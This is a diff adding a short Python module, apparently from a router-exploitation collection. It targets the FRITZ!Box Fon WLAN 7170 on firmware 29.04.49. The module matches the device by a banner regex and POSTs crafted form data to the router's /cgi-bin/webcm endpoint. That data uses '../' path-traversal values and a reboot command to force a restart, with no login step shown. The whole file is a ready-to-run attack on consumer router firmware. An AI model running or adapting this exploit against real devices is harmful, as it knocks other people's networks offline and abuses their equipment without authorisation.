@@ -1,0 +1,12 @@
+"""
+Fon WLAN 7170 Firmware 29.04.49
+"""
+
+vendor = 'FRITZ!Box'
+name = 'Fon WLAN 7170 Firmware 29.04.49'
+regex = r'(?s).*(FRITZ!Box).*'
+
+# step #1
+data = 'getpage=..%2Fhtml%2Freboot.html&errorpage=..%2Fhtml%2Fde%2Fmenus%2Fmenu2.html&var%3Alang=de&var%3Apagename=reset&var%3Aerrorpagename=reset&var%3Amenu=system&var%3Apagemaster=&time%3Asettings%2Ftime=&var%3AtabReset=0&logic%3Acommand%2Freboot=..%2Fgateway%2Fcommands%2Fsaveconfig.html'
+post('http://{routerip}/cgi-bin/webcm', data=data)
+
